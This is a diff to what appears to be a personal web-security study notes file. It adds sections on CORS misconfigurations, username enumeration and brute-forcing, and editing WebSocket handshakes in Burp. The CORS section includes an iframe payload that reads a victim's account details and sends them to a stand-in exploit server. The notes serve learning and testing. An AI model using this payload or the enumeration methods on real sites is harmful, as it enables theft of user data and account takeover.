@@ -1,6 +1,5 @@
 
 
-
 # <font color="red">XSS</font>
 #### 1- check for any value you can control (parameter , path, header, cookie) is being reflected in the **HTML** or used by **JS** code  
 
@@ -498,6 +497,26 @@ note : use turbo intruder (a burp extension ) for testing race condition
 
 # <font color="red">CORS</font>
 
+cross origin resource sharing is a browser mechanism which enables controlled access to resources located outside of a given domain. it extends and adds flexibility to the same origin policy (SOP). 
+
+<font color="red">SOP:</font> The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. 
+
+The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
+
+<font color="red">cors vulnerability with trusted null Origin</font>  :
+sometimes the sensitive endpoint of the website may contain the 
+`Access-Control-Allow-Credentials` which suggesting that it may support cors .
+
+so with this you could test the `Origin: null` and see if the response contains the `Access-Control-Allow-Origin: null` or not .
+
+exploit :
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','vulnerable_site.com/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='exploit_server.com/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>
+```
+the use of iframe sandbox as this generates a null origin request. 
+
+<font color="red">cors vulnerability with trusted insecure protocols</font>:
+sometimes the http protocol may be allow in the cors policy so if you do `Origin: http://sth.com` it may respond .
 
 
 # <font color="red">SQLi</font> 
@@ -4824,3 +4843,40 @@ The simplified example below shows a series of aliased queries checking whether 
 query isValidDiscount($code: Int) { isvalidDiscount(code:$code){ valid } isValidDiscount2:isValidDiscount(code:$code){ valid } isValidDiscount3:isValidDiscount(code:$code){ valid } }
 
 ```
+# <font color="red">Authentication</font >
+
+
+Most vulnerabilities in authentication mechanisms occur in one of two ways:
+
+- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
+- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called "broken authentication".
+
+## Brute-forcing usernames
+
+Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format `firstname.lastname@somecompany.com`. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as `admin` or `administrator`.
+
+
+## Username enumeration
+
+Username enumeration is when an attacker is able to observe changes in the website's behavior in order to identify whether a given username is valid.
+
+Username enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.
+
+While attempting to brute-force a login page, you should pay particular attention to any differences in:
+
+- **Status codes**: During a brute-force attack, the returned HTTP status code is likely to be the same for the vast majority of guesses because most of them will be wrong. If a guess returns a different status code, this is a strong indication that the username was correct. It is best practice for websites to always return the same status code regardless of the outcome, but this practice is not always followed.
+- **Error messages**: Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect. It is best practice for websites to use identical, generic messages in both cases, but small typing errors sometimes creep in. Just one character out of place makes the two messages distinct, even in cases where the character is not visible on the rendered page.
+- **Response times**: If most of the requests were handled with a similar response time, any that deviate from this suggest that something different was happening behind the scenes. This is another indication that the guessed username might be correct. For example, a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.
+
+//14
+
+
+
+
+# <font color="red">Websocket </font>
+### how to manipulate the websocket handshake
+
+- Send a WebSocket message to Burp Repeater.
+- In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.
+- If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.
+- When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater.
